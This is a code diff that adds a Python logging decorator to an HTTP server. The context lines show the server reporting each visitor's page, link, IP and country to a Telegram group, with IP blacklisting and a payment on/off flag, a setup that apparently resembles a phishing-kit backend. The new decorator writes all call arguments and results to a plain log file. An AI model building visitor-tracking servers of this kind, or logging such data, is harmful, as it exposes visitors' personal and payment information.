@@ -9,6 +9,8 @@ import sqlite3
 import traceback
 import json
 from config import BOT_TOKEN, GROUP_ID, ADMIN_ID
+import logging
+from functools import wraps
 
 # Настройки сервера
 PORT = 8080  # Стандартный HTTP порт
@@ -81,6 +83,28 @@ SUPPORT_FLAGS = {}  # ip: {'support': bool, 'text_id': str}
 # --- Глобальний флаг для платіжки ---
 PAYMENT_DISABLED = False
 
+# --- Logging setup ---
+logging.basicConfig(
+    filename='server.log',
+    level=logging.INFO,
+    format='%(asctime)s | %(levelname)s | %(funcName)s | %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+
+def log_function(func):
+    @wraps(func)
+    def wrapper(*args, **kwargs):
+        logging.info(f'start | args={args} kwargs={kwargs}')
+        try:
+            result = func(*args, **kwargs)
+            logging.info(f'success | result={result}')
+            return result
+        except Exception as e:
+            logging.error(f'error | Exception: {e}', exc_info=True)
+            raise
+    return wrapper
+
+@log_function
 def send_telegram_log(page, link, ip, country="", extra_user_id=None):
     # Визначаємо країну за IP, якщо не передано
     if not country:
@@ -134,6 +158,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         ip = get_real_ip(self)
         return ip in BLACKLISTED_IPS
 
+    @log_function
     def do_GET(self):
         # --- Блокування IP ---
         if self.is_blocked():
@@ -351,6 +376,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         except Exception as e:
             self.send_error(500, f"Internal Server Error: {e}")
 
+    @log_function
     def do_POST(self):
         path = unquote(self.path.split('?' ,1)[0])
         # --- Блокування IP ---
